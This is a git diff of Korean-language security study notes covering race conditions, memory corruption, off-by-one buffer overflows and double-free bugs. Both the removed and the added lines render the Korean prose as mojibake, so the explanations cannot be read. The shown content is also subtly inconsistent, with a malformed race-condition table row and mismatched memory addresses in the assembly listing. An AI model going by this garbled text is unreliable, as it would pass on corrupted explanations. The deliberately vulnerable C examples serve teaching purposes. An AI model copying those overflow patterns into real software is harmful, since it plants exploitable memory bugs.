-//¿¹Á¦ 4-6 ) 4-5¿¡¼­ ¼öÁ¤µÈ main ÇÔ¼ö
+//ì˜ˆì œ 4-6 ) 4-5ì—ì„œ ìˆ˜ì •ëœ main í•¨ìˆ˜
 int main(){
     while(1){
         concurrent_solver();
@@ -220,68 +220,68 @@ int main(){
     return 0;
 }
 ```
-![alt text](img/image.png) ÀÌ·¸°Ô ¸¶Áö¸·ÁÙ¿¡ total count°ªÀÌ 300ÀÎ °ÍÀ» º¼ ¼ö ÀÖ´Ù.
-ÇÁ·Î±×·¥ÀÌ ¿ì¸®°¡ ÀÛ¼ºÇÑ ´ë·Î µ¿ÀÛÇßÀ¸¸é Ç×»ó 4*100=400ÀÌ µÇ¾î¾ßÇÏÁö¸¸ ´Ù¸£°Ô ³ª¿Ô´Ù.
+![alt text](img/image.png) ì´ë ‡ê²Œ ë§ˆì§€ë§‰ì¤„ì— total countê°’ì´ 300ì¸ ê²ƒì„ ë³¼ ìˆ˜ ìžˆë‹¤.
+í”„ë¡œê·¸ëž¨ì´ ìš°ë¦¬ê°€ ìž‘ì„±í•œ ëŒ€ë¡œ ë™ìž‘í–ˆìœ¼ë©´ í•­ìƒ 4*100=400ì´ ë˜ì–´ì•¼í•˜ì§€ë§Œ ë‹¤ë¥´ê²Œ ë‚˜ì™”ë‹¤.
 
 Why???
 
-¡å ¿¹Á¦ 4-6¿¡¼­ µÎ ½º·¹µå°¡ ¼öÇàÇÏ´Â ¸í·ÉÀ» ½Ã°£¿¡ µû¶ó µµ½ÄÈ­
-|½Ã°£|Thread A (CPU 0)|Thread B (CPU 1)|
+â–¼ ì˜ˆì œ 4-6ì—ì„œ ë‘ ìŠ¤ë ˆë“œê°€ ìˆ˜í–‰í•˜ëŠ” ëª…ë ¹ì„ ì‹œê°„ì— ë”°ë¼ ë„ì‹í™”
+|ì‹œê°„|Thread A (CPU 0)|Thread B (CPU 1)|
 |---|---|---|
 |1|int temp=total_count_;|int temp =total_count_;|
 |2|for() temp++|for() temp++|
 |3|total_count_=temp;|total_count_|temp;|
 
-Ç¥¸¦º¸¸é, MyThreadFunction() Ã¹¹øÂ° ÁÙÀÌ ¿øÀÎÀÌ´Ù.
+í‘œë¥¼ë³´ë©´, MyThreadFunction() ì²«ë²ˆì§¸ ì¤„ì´ ì›ì¸ì´ë‹¤.
 
-temp º¯¼ö¿¡ µé¾î°¡´Â ÀÔ·Â¿¡ µû¶ó total_count_ °á°ú°ªÀÌ Á¤ÇØÁö´Âµ¥, ½º·¹µåA, ½º·¹µåB µÑ´Ù total_count_ ·ÎºÎÅÍ °°Àº °ªÀ» ¹Þ±â ¶§¹®¿¡ ´ÜÁö ÇÏ³ªÀÇ ½º·¹µå¸¦ ¼öÇàÇÑ °á°ú¸¸ÀÌ ¹Ý¿µµÈ´Ù.
+temp ë³€ìˆ˜ì— ë“¤ì–´ê°€ëŠ” ìž…ë ¥ì— ë”°ë¼ total_count_ ê²°ê³¼ê°’ì´ ì •í•´ì§€ëŠ”ë°, ìŠ¤ë ˆë“œA, ìŠ¤ë ˆë“œB ë‘˜ë‹¤ total_count_ ë¡œë¶€í„° ê°™ì€ ê°’ì„ ë°›ê¸° ë•Œë¬¸ì— ë‹¨ì§€ í•˜ë‚˜ì˜ ìŠ¤ë ˆë“œë¥¼ ìˆ˜í–‰í•œ ê²°ê³¼ë§Œì´ ë°˜ì˜ëœë‹¤.
 
-µû¶ó¼­ µÎ ½º·¹µå¸¦ ¼öÇàÇÏ°í ÇÏ³ªÀÇ ½º·¹µå¸¸ ¼öÇàÇÑ È¿°ú¸¦ ¾ò´Â´Ù.
+ë”°ë¼ì„œ ë‘ ìŠ¤ë ˆë“œë¥¼ ìˆ˜í–‰í•˜ê³  í•˜ë‚˜ì˜ ìŠ¤ë ˆë“œë§Œ ìˆ˜í–‰í•œ íš¨ê³¼ë¥¼ ì–»ëŠ”ë‹¤.
 
-> ¿©·¯ ÇÁ·Î¼¼½º³ª ½º·¹µå°¡ ¼öÇàµÇ´Â ¼ø¼­¿¡ µû¶ó ¼öÇà°á°ú°¡ ´Þ¶óÁö´Â Çö»óÀ» <ins>·¹ÀÌ½º ÄÁµð¼Ç</ins>ÀÌ¶ó°í ÇÑ´Ù.
+> ì—¬ëŸ¬ í”„ë¡œì„¸ìŠ¤ë‚˜ ìŠ¤ë ˆë“œê°€ ìˆ˜í–‰ë˜ëŠ” ìˆœì„œì— ë”°ë¼ ìˆ˜í–‰ê²°ê³¼ê°€ ë‹¬ë¼ì§€ëŠ” í˜„ìƒì„ <ins>ë ˆì´ìŠ¤ ì»¨ë””ì…˜</ins>ì´ë¼ê³  í•œë‹¤.
 
-#### ·¹ÀÌ½º ÄÁµð¼Ç Ãë¾àÁ¡
-¾ÕÀÇ MyThreadFunctionÇÔ¼ö¸¦ ¾Æ·¡¿Í °°ÀÌ ¼öÁ¤ÇØº¸ÀÚ
+#### ë ˆì´ìŠ¤ ì»¨ë””ì…˜ ì·¨ì•½ì 
+ì•žì˜ MyThreadFunctioní•¨ìˆ˜ë¥¼ ì•„ëž˜ì™€ ê°™ì´ ìˆ˜ì •í•´ë³´ìž
 ```c
-//¿¹Á¦ 4-7 ) ¼öÁ¤µÈ MyThreadFunction() ÇÔ¼ö
+//ì˜ˆì œ 4-7 ) ìˆ˜ì •ëœ MyThreadFunction() í•¨ìˆ˜
 DWORD WINAPI MyThreadFunction (LPVOID lpParam){
     for (int i=0; i<kIncreaseLoopCount;i++) total_count_++;
     return 0;
 }
 ```
-¡å ¿¹Á¦ 4-7¿¡¼­ µÎ ½º·¹µå°¡ ¼öÇàÇÏ´Â ¸í·ÉÀ» ½Ã°£¿¡ µû¶ó µµ½ÄÈ­
-|½Ã°£|Thread A (CPU 0)|Thread B (CPU 1)|
+â–¼ ì˜ˆì œ 4-7ì—ì„œ ë‘ ìŠ¤ë ˆë“œê°€ ìˆ˜í–‰í•˜ëŠ” ëª…ë ¹ì„ ì‹œê°„ì— ë”°ë¼ ë„ì‹í™”
+|ì‹œê°„|Thread A (CPU 0)|Thread B (CPU 1)|
 |---|---|---|
 |1|total_count_++;|total_count_++;|
 
-CPU¿¡¼­ ÇÑ¹ø¿¡ Ã³¸®µÇ´Â ¸í·ÉÀÌ¹Ç·Î ÇØ°áµÉ±î ½Í¾ú´Âµ¥ ´Ù½Ã ¾û¶×ÇÑ ¼ýÀÚ°¡ ³ª¿Â´Ù.
+CPUì—ì„œ í•œë²ˆì— ì²˜ë¦¬ë˜ëŠ” ëª…ë ¹ì´ë¯€ë¡œ í•´ê²°ë ê¹Œ ì‹¶ì—ˆëŠ”ë° ë‹¤ì‹œ ì—‰ëš±í•œ ìˆ«ìžê°€ ë‚˜ì˜¨ë‹¤.
 
 Why???
 
-total_count_ ++ ´Â C¾ð¾î¿¡¼­ ÇÏ³ªÀÇ ¿¬»êÀÌÁö¸¸, »çÄ¢¿¬»ê°ú °ü·ÃµÈ ¸í·É¾îµéÀº ÀÎÀÚ°ª Áß ÇÏ³ª°¡ ·¹Áö½ºÅÍ¿©¾ßÇÏ´Â ±ÔÄ¢ÀÌ ÀÖ¾î 3°³ÀÇ ¸í·ÉÀ¸·Î ³ª´¶´Ù.
+total_count_ ++ ëŠ” Cì–¸ì–´ì—ì„œ í•˜ë‚˜ì˜ ì—°ì‚°ì´ì§€ë§Œ, ì‚¬ì¹™ì—°ì‚°ê³¼ ê´€ë ¨ëœ ëª…ë ¹ì–´ë“¤ì€ ì¸ìžê°’ ì¤‘ í•˜ë‚˜ê°€ ë ˆì§€ìŠ¤í„°ì—¬ì•¼í•˜ëŠ” ê·œì¹™ì´ ìžˆì–´ 3ê°œì˜ ëª…ë ¹ìœ¼ë¡œ ë‚˜ë‰œë‹¤.
 ```assembly
 mov eax,dword ptr ds:[01078130h] 
 add eax,1
 mov dword ptr ds:[9197813h],eax
 ```
-ÃÖÀûÈ­ Á¤µµ¿¡ µû¶ó total_count_ °¡ ¹Ì¸® ·¹Áö½ºÅÍ¿¡ º¹»çµÈ °æ¿ìµµ ÀÖ±â¶§¹®¿¡ ÀÌ¸¦ ±×´ë·Î »ç¿ëÇÑ´Ù.
+ìµœì í™” ì •ë„ì— ë”°ë¼ total_count_ ê°€ ë¯¸ë¦¬ ë ˆì§€ìŠ¤í„°ì— ë³µì‚¬ëœ ê²½ìš°ë„ ìžˆê¸°ë•Œë¬¸ì— ì´ë¥¼ ê·¸ëŒ€ë¡œ ì‚¬ìš©í•œë‹¤.
 
-¡å total_count++ °¡ CPU¿¡¼­ <ins>±â°è¾î</ins>·Î ½ÇÇàµÇ´Â ¹æ½Ä
-|½Ã°£|Thread A (CPU 0)|Thread B (CPU 1)|
+â–¼ total_count++ ê°€ CPUì—ì„œ <ins>ê¸°ê³„ì–´</ins>ë¡œ ì‹¤í–‰ë˜ëŠ” ë°©ì‹
+|ì‹œê°„|Thread A (CPU 0)|Thread B (CPU 1)|
 |--|---|---|
 |1|mov eax,dword ptr ds:[01078130h]|mov eax,dword ptr ds:[01078130h]|
 |2|add eax,1|add eax,1|
 |3|mov dword ptr ds:[9197813h],eax|mov dword ptr ds:[9197813h],eax|
-4-6¿¡¼­ »ç¿ëÇÑ ÆÐÅÏ°ú µ¿ÀÏ ÇÏ´Ù. µû¶ó¼­ µ¿ÀÏÇÑ ¹®Á¦°¡ ¹ß»ýÇÏ°Ô µÈ´Ù.
+4-6ì—ì„œ ì‚¬ìš©í•œ íŒ¨í„´ê³¼ ë™ì¼ í•˜ë‹¤. ë”°ë¼ì„œ ë™ì¼í•œ ë¬¸ì œê°€ ë°œìƒí•˜ê²Œ ëœë‹¤.
 
-### ¸Þ¸ð¸® ¿À¿° °ø°Ý ??
+### ë©”ëª¨ë¦¬ ì˜¤ì—¼ ê³µê²© ??
 ---
-- **¸Þ¸ð¸® ¿À¿° (Memory corruption)** : ÇÁ·Î±×·¡¸Ó ¿¹»ó°ú ´Þ¸®, Àß¸øµÈ ±¸Çö µîÀ¸·Î ÀÇµµÇÏÁö ¾ÊÀº ¸Þ¸ð¸®¸¦ »ç¿ëÀÚ°¡ µ¤¾î¾µ ¼ö ÀÖ´Â ¹®Á¦Á¡
-#### ¸Þ¸ð¸® ¿À¿° °ø°Ý
-- Á¤»óÀûÀÎ ÇÁ·Î±×·¥ ¼öÇàÀ» ¹æÇØÇÏ´Â ¸Þ¸ð¸® Á¶ÀÛ
-- ÇÁ·Î±×·¥ÀÌ °³¹ßÀÚÀÇ ÀÇµµ¿Í ´Ù¸£°Ô ¸Þ¸ð¸®¸¦ ¾²°Å³ª ÀÐ´Â ÇàÀ§
+- **ë©”ëª¨ë¦¬ ì˜¤ì—¼ (Memory corruption)** : í”„ë¡œê·¸ëž˜ë¨¸ ì˜ˆìƒê³¼ ë‹¬ë¦¬, ìž˜ëª»ëœ êµ¬í˜„ ë“±ìœ¼ë¡œ ì˜ë„í•˜ì§€ ì•Šì€ ë©”ëª¨ë¦¬ë¥¼ ì‚¬ìš©ìžê°€ ë®ì–´ì“¸ ìˆ˜ ìžˆëŠ” ë¬¸ì œì 
+#### ë©”ëª¨ë¦¬ ì˜¤ì—¼ ê³µê²©
+- ì •ìƒì ì¸ í”„ë¡œê·¸ëž¨ ìˆ˜í–‰ì„ ë°©í•´í•˜ëŠ” ë©”ëª¨ë¦¬ ì¡°ìž‘
+- í”„ë¡œê·¸ëž¨ì´ ê°œë°œìžì˜ ì˜ë„ì™€ ë‹¤ë¥´ê²Œ ë©”ëª¨ë¦¬ë¥¼ ì“°ê±°ë‚˜ ì½ëŠ” í–‰ìœ„
 ```c
-//¿¹Á¦ 4-8 ) Á¤¼öÇü º¯¼ö¿Í ¹®ÀÚ¿­ ÇüÅÂÀÇ º¯¼ö¸¦ ¹®ÀÚ¿­·Î Ãâ·ÂÇÏ´Â ÄÚµå
+//ì˜ˆì œ 4-8 ) ì •ìˆ˜í˜• ë³€ìˆ˜ì™€ ë¬¸ìžì—´ í˜•íƒœì˜ ë³€ìˆ˜ë¥¼ ë¬¸ìžì—´ë¡œ ì¶œë ¥í•˜ëŠ” ì½”ë“œ
 #include <stdio.h>
 
 int main()
@@ -295,37 +295,37 @@ int main()
     return 0;
 }
 ```
-¼Ò½º¸¦ º¸¸é a°¡ Á¤¼öÇüÀ¸·Î ¼±¾ðµÊÀ» ¾Ë ¼ö ÀÖ´Ù.
+ì†ŒìŠ¤ë¥¼ ë³´ë©´ aê°€ ì •ìˆ˜í˜•ìœ¼ë¡œ ì„ ì–¸ë¨ì„ ì•Œ ìˆ˜ ìžˆë‹¤.
 
-ÄÄÆÄÀÏµÈ ÄÚµå¸¦ ¸®¹ö½ÌÇÏ´Â ÀÔÀå¿¡¼­´Â a,b ¸ðµÎ ¹®ÀÚ¿­ º¯¼ö¶ó°í ºÐ¼®ÇÑ´Ù.
+ì»´íŒŒì¼ëœ ì½”ë“œë¥¼ ë¦¬ë²„ì‹±í•˜ëŠ” ìž…ìž¥ì—ì„œëŠ” a,b ëª¨ë‘ ë¬¸ìžì—´ ë³€ìˆ˜ë¼ê³  ë¶„ì„í•œë‹¤.
 
 Why ???
 
-ÇÁ·Î±×·¡¹Ö ¾ð¾îÀÇ ¼Ò½ºÄÚµå°¡ ±â°è¾î·Î ¹ø¿ªµÇ¸é¼­ ÀÌ·± ¹®¸Æ¿¡ ´ëÇÑ Á¤º¸¸¦ ºñ¿ö¹ö¸®±â ¶§¹®.
+í”„ë¡œê·¸ëž˜ë° ì–¸ì–´ì˜ ì†ŒìŠ¤ì½”ë“œê°€ ê¸°ê³„ì–´ë¡œ ë²ˆì—­ë˜ë©´ì„œ ì´ëŸ° ë¬¸ë§¥ì— ëŒ€í•œ ì •ë³´ë¥¼ ë¹„ì›Œë²„ë¦¬ê¸° ë•Œë¬¸.
 
-int¸¦ ¹®ÀÚ¿­Ã³·³ »ç¿ëÇÏ´Â °æ¿ìÀÏ»Ó. °³¹ßÀÚ°¡ Ã³À½ ÇÁ·Î±×·¥ÀÇ ±¸Á¶¸¦ ¼³°èÇÒ ¶§´Â °áÇÔÀÌ ¹ß°ßµÉ ¼ö ÀÖ´Ù. ÀÌ¸¦ <ins>µðÀÚÀÎ °áÇÔ (Design Flaw)</ins> ¶ó°íÇÏ´Âµ¥, ÇÁ·Î±×·¡¸Ó°¡ ÀÇµµÇÑ ¹Ù¸¦ ±¸ÇöÇÏ´Â ¹æ¹ý ÀÚÃ¼¿¡ ¹®Á¦°¡ ÀÖ´Â °ÍÀÌ´Ù. 
+intë¥¼ ë¬¸ìžì—´ì²˜ëŸ¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš°ì¼ë¿. ê°œë°œìžê°€ ì²˜ìŒ í”„ë¡œê·¸ëž¨ì˜ êµ¬ì¡°ë¥¼ ì„¤ê³„í•  ë•ŒëŠ” ê²°í•¨ì´ ë°œê²¬ë  ìˆ˜ ìžˆë‹¤. ì´ë¥¼ <ins>ë””ìžì¸ ê²°í•¨ (Design Flaw)</ins> ë¼ê³ í•˜ëŠ”ë°, í”„ë¡œê·¸ëž˜ë¨¸ê°€ ì˜ë„í•œ ë°”ë¥¼ êµ¬í˜„í•˜ëŠ” ë°©ë²• ìžì²´ì— ë¬¸ì œê°€ ìžˆëŠ” ê²ƒì´ë‹¤. 
 
-+ ¸í·É¾î »ðÀÔ °ø°ÝÀÌ ¹ß»ýÇÏ´Â ¼ÒÇÁÆ®¿þ¾î´Â ¸í·É¾î Ã³¸®±â¿¡¼­ Æ¯¼ö¹®ÀÚ°¡ ¾î¶»°Ô Ã³¸®µÇ´ÂÁö¸¦ °£°úÇØ¼­ ¹ß»ýÇÏ´Â µðÀÚÀÎ °áÇÔÀÇ ¹üÁÖ¿¡ ¼ÓÇÑ´Ù.
++ ëª…ë ¹ì–´ ì‚½ìž… ê³µê²©ì´ ë°œìƒí•˜ëŠ” ì†Œí”„íŠ¸ì›¨ì–´ëŠ” ëª…ë ¹ì–´ ì²˜ë¦¬ê¸°ì—ì„œ íŠ¹ìˆ˜ë¬¸ìžê°€ ì–´ë–»ê²Œ ì²˜ë¦¬ë˜ëŠ”ì§€ë¥¼ ê°„ê³¼í•´ì„œ ë°œìƒí•˜ëŠ” ë””ìžì¸ ê²°í•¨ì˜ ë²”ì£¼ì— ì†í•œë‹¤.
 
-ÇÁ·Î±×·¥ : ÄÄÇ»ÅÍ¿¡°Ô Æ¯Á¤ ÀÛ¾÷À» ¼öÇàÇÏµµ·Ï ÇÏ´Â °£´ÜÇÑ ¸í·É¾î ¹­À½
+í”„ë¡œê·¸ëž¨ : ì»´í“¨í„°ì—ê²Œ íŠ¹ì • ìž‘ì—…ì„ ìˆ˜í–‰í•˜ë„ë¡ í•˜ëŠ” ê°„ë‹¨í•œ ëª…ë ¹ì–´ ë¬¶ìŒ
 
-`¼Ò½ºÄÚµå -> (ÄÄÆÄÀÏ·¯) -> ¾î¼Àºí¸®ÄÚµå -> (¾î¼Àºí·¯) -> ±â°è¾î -> (CPU) -> ½ÇÇà`
+`ì†ŒìŠ¤ì½”ë“œ -> (ì»´íŒŒì¼ëŸ¬) -> ì–´ì…ˆë¸”ë¦¬ì½”ë“œ -> (ì–´ì…ˆë¸”ëŸ¬) -> ê¸°ê³„ì–´ -> (CPU) -> ì‹¤í–‰`
 
-±â°è¾î¿Í ºñ±³ÇÏ¸é C¾ð¾î´Â high level ¾ð¾î·Î ¸¹Àº Ãß»óÀû °³³äÀ» Æ÷ÇÔÇÏ°íÀÖ´Ù.
-- ex) C¾ð¾î¿¡¼­ »ç¿ëÇÏ´Â µ¥ÀÌÅÍ Å¸ÀÔÀº ±â°è¾î·Î Ç¥ÇöÇÒ ¼ö ¾ø´Â Ãß»óÀû °³³äÀÌ´Ù. `¹è¿­±æÀÌ, int, char, double °°Àº µ¥ÀÌÅÍ Å¸ÀÔ ¿ª½Ã ±â°è¾î·Î Ç¥Çö ºÒ°¡.` ´Ù¸¸ ¸í·É¾îÀÇ ÀÎÀÚ·Î °£Á¢ÀûÀ¸·Î À¯Ãß°¡´É. 
+ê¸°ê³„ì–´ì™€ ë¹„êµí•˜ë©´ Cì–¸ì–´ëŠ” high level ì–¸ì–´ë¡œ ë§Žì€ ì¶”ìƒì  ê°œë…ì„ í¬í•¨í•˜ê³ ìžˆë‹¤.
+- ex) Cì–¸ì–´ì—ì„œ ì‚¬ìš©í•˜ëŠ” ë°ì´í„° íƒ€ìž…ì€ ê¸°ê³„ì–´ë¡œ í‘œí˜„í•  ìˆ˜ ì—†ëŠ” ì¶”ìƒì  ê°œë…ì´ë‹¤. `ë°°ì—´ê¸¸ì´, int, char, double ê°™ì€ ë°ì´í„° íƒ€ìž… ì—­ì‹œ ê¸°ê³„ì–´ë¡œ í‘œí˜„ ë¶ˆê°€.` ë‹¤ë§Œ ëª…ë ¹ì–´ì˜ ì¸ìžë¡œ ê°„ì ‘ì ìœ¼ë¡œ ìœ ì¶”ê°€ëŠ¥. 
 
-#### ¹öÆÛ ¿À¹öÇÃ·Î¿ì °ø°Ý
-- ÇÁ·Î±×·¡¸Ó°¡ »ç¿ëÇÏ·Á°í ÇÒ´çÇÑ ¸Þ¸ð¸®º¸´Ù ´õ ¸¹Àº ¾çÀÇ ¸Þ¸ð¸®¸¦ µ¤¾î¾µ ¶§ ¹ß»ý
-1. ¹öÆÛ¿À¹öÇÃ·Î¿ì°¡ ¹ß»ýÇÏ´Â ¸Þ¸ð¸® ¿µ¿ªÀ» ±âÁØÀ¸·Î ºÐ·ù.
-2. Ãë¾àÇÑ ÄÚµå ÆÐÅÏ¿¡ µû¸¥ ºÐ·ù.
-- ÀÎÁ¢ÇÑ ¸Þ¸ð¸® ¿µ¿ª µ¤¾î¾²±â
-- ¿Àºê ¹ÙÀÌ ¿ø ¹ö±× 
-    - ¿ÀÇÁ ¹ÙÀÌ¿ø : 1Â÷ÀÌ·Î ÀÎÇØ ¿Àµ¿ÀÛÇÏ´Â ³í¸® ¿À·ù
-    - ¿¬»ê ¼öÇàÇÏ´Â ¹Ýº¹¹® ±¸Á¶¿¡¼­ È½¼ö¸¦ ÁöÁ¤ÇÒ¶§ ÀÚÁÖ ¹ß»ý.
-    - 1byte¸¸ µ¤¾î¾µ ¼ö ÀÖÀ¸¸é ¹» ÇÒ¼öÀÖÀ»±î?
+#### ë²„í¼ ì˜¤ë²„í”Œë¡œìš° ê³µê²©
+- í”„ë¡œê·¸ëž˜ë¨¸ê°€ ì‚¬ìš©í•˜ë ¤ê³  í• ë‹¹í•œ ë©”ëª¨ë¦¬ë³´ë‹¤ ë” ë§Žì€ ì–‘ì˜ ë©”ëª¨ë¦¬ë¥¼ ë®ì–´ì“¸ ë•Œ ë°œìƒ
+1. ë²„í¼ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•˜ëŠ” ë©”ëª¨ë¦¬ ì˜ì—­ì„ ê¸°ì¤€ìœ¼ë¡œ ë¶„ë¥˜.
+2. ì·¨ì•½í•œ ì½”ë“œ íŒ¨í„´ì— ë”°ë¥¸ ë¶„ë¥˜.
+- ì¸ì ‘í•œ ë©”ëª¨ë¦¬ ì˜ì—­ ë®ì–´ì“°ê¸°
+- ì˜¤ë¸Œ ë°”ì´ ì› ë²„ê·¸ 
+    - ì˜¤í”„ ë°”ì´ì› : 1ì°¨ì´ë¡œ ì¸í•´ ì˜¤ë™ìž‘í•˜ëŠ” ë…¼ë¦¬ ì˜¤ë¥˜
+    - ì—°ì‚° ìˆ˜í–‰í•˜ëŠ” ë°˜ë³µë¬¸ êµ¬ì¡°ì—ì„œ íšŸìˆ˜ë¥¼ ì§€ì •í• ë•Œ ìžì£¼ ë°œìƒ.
+    - 1byteë§Œ ë®ì–´ì“¸ ìˆ˜ ìžˆìœ¼ë©´ ë­˜ í• ìˆ˜ìžˆì„ê¹Œ?
 
         ```c
-        //¿¹Á¦ 4-9 ) 1¹ÙÀÌÆ® ¿À¹öÇÃ·Î¿ì¿¡ Ãë¾àÇÑ ¿¹Á¦
+        //ì˜ˆì œ 4-9 ) 1ë°”ì´íŠ¸ ì˜¤ë²„í”Œë¡œìš°ì— ì·¨ì•½í•œ ì˜ˆì œ
         #include <stdio.h>
         #include <string.h>
 
@@ -335,8 +335,8 @@ int¸¦ ¹®ÀÚ¿­Ã³·³ »ç¿ëÇÏ´Â °æ¿ìÀÏ»Ó. °³¹ßÀÚ°¡ Ã³À½ ÇÁ·Î±×·¥ÀÇ ±¸Á¶¸¦ ¼³°èÇÒ ¶§´Â 
             char out_buf[128]="";
             int in_buf_len=strlen(in_buf);
             for (int i=0; i<=in_buf_len;i++){
-                out_buf[i]=in_buf[i];   //out_buf°¡ strlen(in_buf)+nullÆ÷ÇÔ ÃÖ´ë 129ÀÚ ±îÁö °¡´É
-                // ÇÏÁö¸¸, strlen(in_buf)±æÀÌ°¡ 128·Î Á¤ÇØÁ®ÀÖÀ¸¹Ç·Î, in_bufÅ©±â°¡ 128À» ³ÑÀ¸¸é overflow ¹ß»ý
+                out_buf[i]=in_buf[i];   //out_bufê°€ strlen(in_buf)+nullí¬í•¨ ìµœëŒ€ 129ìž ê¹Œì§€ ê°€ëŠ¥
+                // í•˜ì§€ë§Œ, strlen(in_buf)ê¸¸ì´ê°€ 128ë¡œ ì •í•´ì ¸ìžˆìœ¼ë¯€ë¡œ, in_bufí¬ê¸°ê°€ 128ì„ ë„˜ìœ¼ë©´ overflow ë°œìƒ
             }
         }
 
@@ -345,7 +345,7 @@ int¸¦ ¹®ÀÚ¿­Ã³·³ »ç¿ëÇÏ´Â °æ¿ìÀÏ»Ó. °³¹ßÀÚ°¡ Ã³À½ ÇÁ·Î±×·¥ÀÇ ±¸Á¶¸¦ ¼³°èÇÒ ¶§´Â 
             int in_buf_len=strlen(in_buf);
 
             if(in_buf_len<=kBufSize){
-                strcpy(out_buf,in_buf); //in_buf°¡ 128byte¸é, strcpy°¡ ³Î±îÁö Æ÷ÇÔÇÏ¿© 129byte¸¦ in_buf¿¡ º¸³» overflow ¹ß»ý
+                strcpy(out_buf,in_buf); //in_bufê°€ 128byteë©´, strcpyê°€ ë„ê¹Œì§€ í¬í•¨í•˜ì—¬ 129byteë¥¼ in_bufì— ë³´ë‚´ overflow ë°œìƒ
             }
             printf("%s\n",out_buf);
         }
@@ -354,18 +354,18 @@ int¸¦ ¹®ÀÚ¿­Ã³·³ »ç¿ëÇÏ´Â °æ¿ìÀÏ»Ó. °³¹ßÀÚ°¡ Ã³À½ ÇÁ·Î±×·¥ÀÇ ±¸Á¶¸¦ ¼³°èÇÒ ¶§´Â 
             off_by_one1(argv[1]);
         }
         ```
-        - **strcpy**´Â Ãß°¡ÀûÀ¸·Î null±îÁö Æ÷ÇÔÇÏ¿© º¹»çÇÑ´Ù.
-        - ÄÄÆÄÀÏ·¯¿¡¼­ ÀÚµ¿À¸·Î º¯¼ö»çÀÌ¿¡ ÀÓÀÇÀÇ ¹ÙÀÌÆ®¸¦ ³Ö´Â PaddingÀÌ¶ó´Â °³³ä¶§¹®¿¡ ÀÚÁÖ ¹ß»ýÇÏ´Â Á¶°ÇÀÌ ÇÊ¿äÇÏÁö¸¸, ¿À·¡µÈ ÇÁ·Î±×·¥ÀÌ³ª ÄÄÆÄÀÏ·¯ÀÇ °æ¿ì Á¾Á¾ ¹ß°ß °¡´É.
-- ´õºíÇÁ¸® ¹ö±×
-    - `free()` ÇÔ¼ö°¡ µÎ¹ø ÀÌ»ó °°Àº ¸Þ¸ð¸®¿¡ È£ÃâµÇ¾úÀ»¶§  ¹ß»ý
-    - ÇÁ·Î±×·¥ ±¸Á¶°¡ º¹ÀâÇØ ¸Þ¸ð¸®¸¦ ¾îµð¼­ ÇØÃ¼ÇØ¾ßÇÒÁö Âø°¢ÇÏ¿© ÄÚµå ¹èÄ¡¸¦ Àß¸ø ÇßÀ»¶§ ¹ß»ý
-    - ¿¹¿ÜÃ³¸®ÀÇ ½Ç¼ö¸¦ ¾Ç¿ëÇÑ °ø°ÝÀÚ°¡ ÀÇµµÀûÀÎ ¿¡·¯¸¦ À¯¹ßÇØ ÇÁ·Î±×·¥ ¹ö±×¸¦ ¸¸µê
-    - °°Àº ÁÖ¼Ò¸¦ Áßº¹ÇØ¼­ free()°¡µÇ¸é ¹öÆÛ¿À¹öÇÃ·Î¿ì Çö»ó ¹ß»ý°¡´É (malloc()ÀÌ µÎ¹ø °°Àº ¸Þ¸ð¸®¸¦ ¸®ÅÏÇÒ ¼ö ÀÖ°Ô µÇ°í, ÀÌ¸¦ ÀÌ¿ëÇØ °ø°ÝÀÚ°¡ ¹öÆÛ ¿À¹öÇÃ·Î¿ì Çö»óÀ» ÀÏÀ¸Å´)
-    - ÇÑ ¸Þ¸ð¸®°¡ ¼­·Î ´Ù¸¥ µÎ ½ºÆ®¸µÀ¸·Î »ç¿ëµÇ´Âµ¥ ÇÑ°÷¿¡¼­´Â a, ÇÑ°÷¿¡¼­´Â b·Î Á¦ÇÑÇØ¼­ »ç¿ëÇÑ´ÙÇÏÀÚ.
-        - => <ins>Å« ÂÊÀ¸·Î ¸Þ¸ð¸®¸¦ Ã¤¿ì°í ÀÛÀº ÂÊ¿¡¼­ »ç¿ëÇÏ°ÔÇÏ¸é »ó´ëÀû ±æÀÌÂ÷·Î ¹öÆÛ ¿À¹öÇÃ·Î¿ì ¹ß»ý ½ÃÅ³¼ö ÀÖ´Ù.</ins>
+        - **strcpy**ëŠ” ì¶”ê°€ì ìœ¼ë¡œ nullê¹Œì§€ í¬í•¨í•˜ì—¬ ë³µì‚¬í•œë‹¤.
+        - ì»´íŒŒì¼ëŸ¬ì—ì„œ ìžë™ìœ¼ë¡œ ë³€ìˆ˜ì‚¬ì´ì— ìž„ì˜ì˜ ë°”ì´íŠ¸ë¥¼ ë„£ëŠ” Paddingì´ë¼ëŠ” ê°œë…ë•Œë¬¸ì— ìžì£¼ ë°œìƒí•˜ëŠ” ì¡°ê±´ì´ í•„ìš”í•˜ì§€ë§Œ, ì˜¤ëž˜ëœ í”„ë¡œê·¸ëž¨ì´ë‚˜ ì»´íŒŒì¼ëŸ¬ì˜ ê²½ìš° ì¢…ì¢… ë°œê²¬ ê°€ëŠ¥.
+- ë”ë¸”í”„ë¦¬ ë²„ê·¸
+    - `free()` í•¨ìˆ˜ê°€ ë‘ë²ˆ ì´ìƒ ê°™ì€ ë©”ëª¨ë¦¬ì— í˜¸ì¶œë˜ì—ˆì„ë•Œ  ë°œìƒ
+    - í”„ë¡œê·¸ëž¨ êµ¬ì¡°ê°€ ë³µìž¡í•´ ë©”ëª¨ë¦¬ë¥¼ ì–´ë””ì„œ í•´ì²´í•´ì•¼í• ì§€ ì°©ê°í•˜ì—¬ ì½”ë“œ ë°°ì¹˜ë¥¼ ìž˜ëª» í–ˆì„ë•Œ ë°œìƒ
+    - ì˜ˆì™¸ì²˜ë¦¬ì˜ ì‹¤ìˆ˜ë¥¼ ì•…ìš©í•œ ê³µê²©ìžê°€ ì˜ë„ì ì¸ ì—ëŸ¬ë¥¼ ìœ ë°œí•´ í”„ë¡œê·¸ëž¨ ë²„ê·¸ë¥¼ ë§Œë“¦
+    - ê°™ì€ ì£¼ì†Œë¥¼ ì¤‘ë³µí•´ì„œ free()ê°€ë˜ë©´ ë²„í¼ì˜¤ë²„í”Œë¡œìš° í˜„ìƒ ë°œìƒê°€ëŠ¥ (malloc()ì´ ë‘ë²ˆ ê°™ì€ ë©”ëª¨ë¦¬ë¥¼ ë¦¬í„´í•  ìˆ˜ ìžˆê²Œ ë˜ê³ , ì´ë¥¼ ì´ìš©í•´ ê³µê²©ìžê°€ ë²„í¼ ì˜¤ë²„í”Œë¡œìš° í˜„ìƒì„ ì¼ìœ¼í‚´)
